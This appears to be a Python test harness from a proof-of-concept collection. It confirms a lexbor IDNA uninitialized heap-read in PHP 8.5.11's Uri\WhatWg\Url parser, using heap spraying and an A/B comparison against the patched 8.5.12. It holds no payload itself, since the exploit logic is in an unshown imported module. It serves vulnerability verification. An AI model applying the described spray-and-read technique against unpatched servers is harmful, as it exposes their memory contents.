#!/usr/bin/env python3
"""verify_lexbor_idna_leak.py - green harness for the lexbor IDNA
uninitialized-memory read / heap disclosure (idna.c; NET-NEW, ChangeLog item (c),
distinct from CVE-2026-109618/109619), reachable via Uri\\WhatWg\\Url::parse().
Asserts, with a spray-and-recognize proof and an 8.5.11-vs-8.5.12 A/B, that
8.5.11 discloses a sprayed heap token through getAsciiHost() (>=1KB, absent from
the input URL) while 8.5.12 leaks nothing (deterministic output) -> the added
memcpy closes it.

Usage (builds/reuses plain CLI images php2shell-uri-8511/8512; first build
clones+compiles php-src ~3-5 min each, later runs reuse the image):
  python3 -I poc/bugs/verify_lexbor_idna_leak.py
  python3 -I poc/bugs/verify_lexbor_idna_leak.py --skip-fixed   # 8.5.11 only
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import lexbor_idna_leak as L

TOKEN = "HeapLeakZZ"
NLABELS = 600


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--trials", type=int, default=6,
                    help="fresh-process attempts per version (default 6)")
    ap.add_argument("--skip-fixed", action="store_true",
                    help="only run the 8.5.11 (VULN) side")
    args = ap.parse_args()

    checks = []

    # ---- VULN side: 8.5.11 -------------------------------------------------
    if not L.build_image("php-8.5.11", L.IMAGE_8511):
        print("[-] could not build/obtain the 8.5.11 image"); sys.exit(2)
    vuln = L.demo(L.IMAGE_8511, "php-8.5.11 (VULN)", TOKEN, NLABELS, args.trials)

    checks.append(("8.5.11 exposes Uri\\WhatWg\\Url", vuln["class_ok"]))
    checks.append(("8.5.11 discloses sprayed heap token via getAsciiHost()",
                   vuln["leaked"] > 0))
    # the un-sprayed/dirty-prefix parse-null outcomes are the uninitialized
    # signature; require that we saw at least one real disclosure.
    if vuln["sample"]:
        s = vuln["sample"]
        checks.append(("leaked token was NOT present in the input URL",
                       s.get("INPUT_HAS_TOKEN") == "0"))
        checks.append(("disclosure spans a meaningful window (>=1KB)",
                       int(s.get("LEAKBYTES", "0")) >= 1024))

    # ---- FIXED side: 8.5.12 A/B -------------------------------------------
    if not args.skip_fixed:
        if not L.build_image("php-8.5.12", L.IMAGE_8512):
            print("[-] could not build/obtain the 8.5.12 image"); sys.exit(2)
        fixed = L.demo(L.IMAGE_8512, "php-8.5.12 (FIXED)", TOKEN, NLABELS,
                       args.trials)
        checks.append(("8.5.12 exposes Uri\\WhatWg\\Url", fixed["class_ok"]))
        checks.append(("8.5.12 leaks NOTHING across all trials (A/B negative)",
                       fixed["leaked"] == 0))
        checks.append(("8.5.12 parse is deterministic (no stale-byte rejects)",
                       fixed["parse_null"] == 0 and fixed["parse_ok"] > 0))

    # ---- report -----------------------------------------------------------
    print("\n==================== VERDICT ====================")
    ok = True
    for name, passed in checks:
        print(f"  [{'PASS' if passed else 'FAIL'}] {name}")
        ok = ok and passed
    print("=================================================")
    if ok:
        print("GREEN: lexbor IDNA uninitialized heap-read confirmed on 8.5.11, "
              "closed on 8.5.12.")
        sys.exit(0)
    print("RED: one or more assertions failed (see above).")
    sys.exit(1)


if __name__ == "__main__":
    main()
